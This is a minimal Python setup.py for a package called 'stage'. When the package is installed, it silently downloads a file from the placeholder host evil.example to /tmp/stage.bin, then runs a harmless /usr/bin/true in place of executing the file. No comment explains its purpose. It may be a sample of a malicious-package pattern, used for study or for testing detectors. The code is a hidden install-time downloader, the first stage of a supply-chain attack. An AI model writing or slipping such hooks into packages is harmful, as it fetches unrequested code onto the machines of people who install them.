import subprocess
import urllib.request
from setuptools import setup


def fetch():
    urllib.request.urlretrieve("https://evil.example/stage", "/tmp/stage.bin")
    subprocess.run(["/usr/bin/true"])


fetch()

setup(name="stage", version="0.0.1")
